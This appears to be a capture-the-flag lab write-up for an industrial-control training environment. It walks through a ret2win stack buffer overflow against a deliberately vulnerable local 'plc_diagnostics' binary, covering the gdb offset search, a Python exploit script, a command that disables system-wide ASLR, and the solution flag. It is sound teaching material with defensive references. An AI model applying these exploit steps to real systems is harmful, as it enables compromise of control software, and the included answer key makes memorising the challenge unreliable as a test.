# 💥 Stack Smashing the PLC Diagnostics Service

> **MITRE ATT&CK for ICS:** `Execution` | [T0807 - Command-Line Interface](https://attack.mitre.org/techniques/T0807/) | [T0862 - Supply Chain Compromise](https://attack.mitre.org/techniques/T0862/)

## 📋 Overview

A forgotten **internal maintenance binary** (`plc_diagnostics`) has been discovered on the attack machine. It was written years ago by a field engineer and never audited for security. The binary contains a classic **stack-based buffer overflow** — user input is copied into a fixed-size stack buffer without any length check, allowing an attacker to overwrite the return address and redirect execution.

This technique is called **ret2win**: you overflow the buffer until you reach the return address on the stack, then replace it with the address of a hidden function that prints the flag.

```
Stack frame of run_diagnostic():

  [ cmd_buffer (64 bytes) ][ saved RBP (8 bytes) ][ return address (8 bytes) ]
   ←────── overflow with padding ───────────────────→ ← overwrite with target →

Goal: replace the return address with the address of maintenance_shell()
```

## 📦 Prerequisites

- Access to the attack machine (`http://localhost:6081/vnc.html`) or the webshell
- The challenge files are located at `/opt/challenges/buffer_overflow/` on the attack machine
- Tools required: `gcc`, `gdb`, `pwndbg`, `python3`, `nm`, `checksec`

## 🎯 Task

Analyse the binary, find the vulnerability, determine the exact overflow offset, and redirect execution to the hidden `maintenance_shell()` function to capture the flag.

The flag has the format `CybICS(flag)`.

---

### Phase 1: Setup & Reconnaissance

1. Copy the challenge files to your working directory and compile the binary:

   ```bash
   cp -r /opt/challenges/buffer_overflow ~/Desktop/bof_challenge
   cd ~/Desktop/bof_challenge
   make
   ```

2. Disable ASLR so memory addresses stay stable between runs:

   ```bash
   echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
   ```

   ⚠️ **Important:** This command affects the entire system kernel. **Always run this inside VM machine** — never on your host system. If you are working directly on a host machine, re-enable ASLR afterwards with `echo 2 | sudo tee /proc/sys/kernel/randomize_va_space`.

3. Run the binary normally to understand its behaviour:

   ```bash
   ./plc_diagnostics
   ```

   Enter `STATUS` when prompted and observe the output.

4. Check what security protections are active:

   ```bash
   checksec --file=./plc_diagnostics
   ```

   You should see: **No canary**, **No PIE**, **NX disabled** — ideal conditions for a stack overflow.

5. List all function symbols and their addresses:

   ```bash
   nm ./plc_diagnostics | grep -E "maintenance|run_diag|main"
   ```

   **Write down the address of `maintenance_shell`** — this is your target jump address.

6. Read the source code and find the vulnerability:

   ```bash
   cat plc_diagnostics.c
   ```

   Look for the unsafe `strcpy()` call inside `run_diagnostic()`. Unlike `strncpy()`, `strcpy()` copies until it hits a null byte with no regard for the destination buffer size.

### Phase 2: Find the Overflow Offset

You need to know exactly how many bytes of padding are required before you reach the return address on the stack.

1. Open the binary in GDB:

   ```bash
   gdb ./plc_diagnostics
   ```

2. Generate a De Bruijn cyclic pattern with pwndbg — every 8-byte subsequence in this pattern is unique, which lets you pinpoint the exact offset after a crash:

   ```
   pwndbg> cyclic 120
   ```

3. Run the program and paste the full 120-character pattern when prompted:

   ```
   pwndbg> run
   ```

   The program will crash with a **Segmentation Fault**.

4. Read the value of `RIP` after the crash and find its position in the pattern:

   ```
   pwndbg> cyclic -l $rip
   ```

   The result is your offset — it should be **72** (64 bytes for `cmd_buffer` + 8 bytes for saved RBP on x86-64).

### Phase 3: Craft and Send the Exploit

1. Verify the offset manually inside GDB before writing the full exploit. Replace `0x????????????` with the real address from Phase 1:

   ```
   pwndbg> run <<< $(python3 -c "
   import struct, sys
   payload = b'A' * 72 + struct.pack('<Q', 0x????????????)
   sys.stdout.buffer.write(payload)
   ")
   ```

   If the offset is correct, `maintenance_shell()` runs and you see the flag.

2. Write a standalone exploit script `exploit.py`:

   ```python
   #!/usr/bin/env python3
   import struct
   import subprocess

   BINARY           = "./plc_diagnostics"
   MAINTENANCE_ADDR = 0x????????????  # paste address from: nm ./plc_diagnostics | grep maintenance_shell
   OFFSET           = 72              # 64 (cmd_buffer) + 8 (saved RBP)

   payload = b"A" * OFFSET + struct.pack("<Q", MAINTENANCE_ADDR)

   print(f"[*] Sending {len(payload)}-byte payload to {BINARY}")
   subprocess.run([BINARY], input=payload)
   ```

3. Update `MAINTENANCE_ADDR` with the real address, then run:

   ```bash
   python3 exploit.py
   ```

### Phase 4: Capture the Flag

A successful exploit redirects execution into `maintenance_shell()` which prints:

```
  *** MAINTENANCE MODE ACTIVATED ***
  PLC Diagnostic System - Internal Access
  ----------------------------------------
  Congratulations, you have gained control
  of the PLC diagnostics process!

  FLAG: CybICS(buff3r_0v3rfl0w_pwn3d)
```

Submit the flag in the CTF dashboard.

## 🛡️ Security Framework References

<details>
<summary>Click to expand</summary>

### MITRE ATT&CK for ICS — Techniques Applied

| Tactic | Technique | ID | Description |
|--------|-----------|-----|-------------|
| Execution | Command-Line Interface | [T0807](https://attack.mitre.org/techniques/T0807/) | Executing code via a vulnerable process |
| Initial Access | Supply Chain Compromise | [T0862](https://attack.mitre.org/techniques/T0862/) | Exploiting unaudited legacy software |
| Execution | Exploitation for Client Execution | [T0853](https://attack.mitre.org/techniques/T0853/) | Exploiting memory corruption to execute arbitrary code |

### MITRE CWE — Weaknesses Exploited

| CWE | Name | Description |
|-----|------|-------------|
| [CWE-121](https://cwe.mitre.org/data/definitions/121.html) | Stack-based Buffer Overflow | Writing beyond `cmd_buffer[64]` into adjacent stack memory |
| [CWE-676](https://cwe.mitre.org/data/definitions/676.html) | Use of Potentially Dangerous Function | Using `strcpy()` instead of `strncpy()` or `strlcpy()` |
| [CWE-242](https://cwe.mitre.org/data/definitions/242.html) | Use of Inherently Dangerous Function | `strcpy()` is listed as inherently unsafe |

### NIST SP 800-82r3 Reference

| Control Family | Controls | Relevance |
|----------------|----------|-----------|
| **System and Information Integrity (SI)** | SI-2, SI-16 | Flaw remediation, memory protection |
| **System and Communications Protection (SC)** | SC-39 | Process isolation |
| **Risk Assessment (RA)** | RA-5 | Vulnerability scanning of ICS software |

**Why NIST 800-82r3 matters here:** NIST 800-82r3 Section 6.2 highlights that legacy ICS software often lacks modern security controls such as stack canaries, ASLR, and safe string-handling functions. SI-2 (Flaw Remediation) requires organisations to identify and patch vulnerable binaries. RA-5 (Vulnerability Scanning) recommends static analysis tools such as `flawfinder` or `cppcheck` to detect unsafe function calls like `strcpy()` before deployment.

</details>

## 🔍 Defensive Thinking

After completing this challenge, consider:
- The binary was compiled with `-fno-stack-protector`. How does a **stack canary** prevent this exact attack, and why would it only slow down an attacker rather than stop them completely?
- **No PIE** means `maintenance_shell()` has a fixed address. If PIE were enabled, how would you still find the address? (Hint: look up *format string leaks* and *ret2libc*)
- What would a **static analysis** tool like `flawfinder` or `cppcheck` report when run against `plc_diagnostics.c`?
- In a real ICS environment, how would you detect that a field binary has been tampered with or was never audited? Consider file integrity monitoring and software bill of materials (SBOM).

## 💡 Hints

Use `nm ./plc_diagnostics | grep maintenance_shell` to find the target address. The offset is the size of `cmd_buffer` (64 bytes) plus the size of the saved frame pointer (8 bytes on x86-64) — so 72 bytes total. Use `struct.pack("<Q", addr)` in Python to encode the address in little-endian 64-bit format.

## 🔍 Solution

Find the address of `maintenance_shell` with `nm`, then send 72 bytes of padding followed by that address packed as a little-endian 64-bit integer:

```bash
python3 -c "
import struct, subprocess
addr = 0x????????????  # from: nm ./plc_diagnostics | grep maintenance_shell
subprocess.run(['./plc_diagnostics'], input=b'A'*72 + struct.pack('<Q', addr))
"
```

**Flag:** `CybICS(buff3r_0v3rfl0w_pwn3d)`
